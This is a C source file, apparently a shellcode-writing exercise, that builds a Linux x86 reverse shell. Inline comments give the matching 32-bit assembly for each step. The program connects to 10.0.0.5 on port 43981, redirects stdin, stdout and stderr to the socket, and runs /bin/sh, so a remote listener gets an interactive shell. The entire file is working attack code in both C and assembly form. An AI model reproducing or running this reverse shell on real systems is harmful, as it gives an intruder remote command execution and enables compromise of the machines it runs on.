/*
this is the same source file but with inline assembly for
ease in readability and explanation
*/

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[])
{
    int clnt_sockfd;
    struct sockaddr_in srv_addr;

    /*
global _start
section .text
_start:
    xor ebx, ebx
    mul ebx
    */

    clnt_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    /*
    mov al, 0x66      ; socketcall() <linux/net.h>
    inc ebx           ; socket()
    push edx          ; arg3 :: protocol    = 0
    push ebx          ; arg2 :: SOCK_STREAM = 1
    push byte 0x2     ; arg1 :: AF_INET     = 2
    mov ecx, esp
    int 0x80
    xchg eax, esi     ; save clnt_sockfd in esi
    */

    srv_addr.sin_family      = AF_INET;
    srv_addr.sin_port        = htons(43981); // port; 43981 = 0xABCD
    // others seem to favor a simple assignment w/ inet_addr for
    // IPv4 address conversion to binary
    inet_pton(srv_addr.sin_family, "10.0.0.5", &srv_addr.sin_addr);

    connect(clnt_sockfd, (struct sockaddr*)&srv_addr, sizeof(struct sockaddr));
    /*
    mov al, 0x66          ; socketcall()
    mov bl, 0x3           ; connect()
                          ; build sockaddr_in struct (srv_addr)
    push dword 0x0500000A ;   IPv4 address 10.0.0.5 in hex (little endian)
    push word 0xCDAB      ;   TCP port 0xABCD = 43981
    push word 0x2         ;   AF_INET = 2
    mov ecx, esp          ; pointer to sockaddr_in struct
    push dword 0x10       ; arg3 :: sizeof(struct sockaddr) = 16 [32-bits]
    push ecx              ; arg2 :: pointer to sockaddr_in struct
    push esi              ; arg1 :: clnt_sockfd
    mov ecx, esp
    int 0x80
    */

    dup2(clnt_sockfd, 0);
    dup2(clnt_sockfd, 1);
    dup2(clnt_sockfd, 2);
    /*
    pop ebx          ; arg1 :: clnt_sockfd
    push 0x2
    pop ecx          ; loop from 2 to 0
dup2loop:
    mov byte al, 0x3F ; dup2(2)
    int 0x80
    dec ecx
    jns dup2loop      ; loop ends when ecx == -1
    */

    execve("/bin/sh", NULL, NULL);
    /*
    xor eax, eax
    mov byte al, 0x0B ; execve(2)
    push edx          ; null terminator
    push 0x68732f2f   ; "hs//"
    push 0x6e69622f   ; "nib/"
    mov ebx, esp      ; arg1 :: "/bin/sh\0"
    push edx          ; null terminator
    mov edx, esp      ; arg3 :: envp = NULL array
    push ebx
    mov ecx, esp      ; arg2 :: argv array (ptr to string)
    int 0x80
    */

    return 0;
}
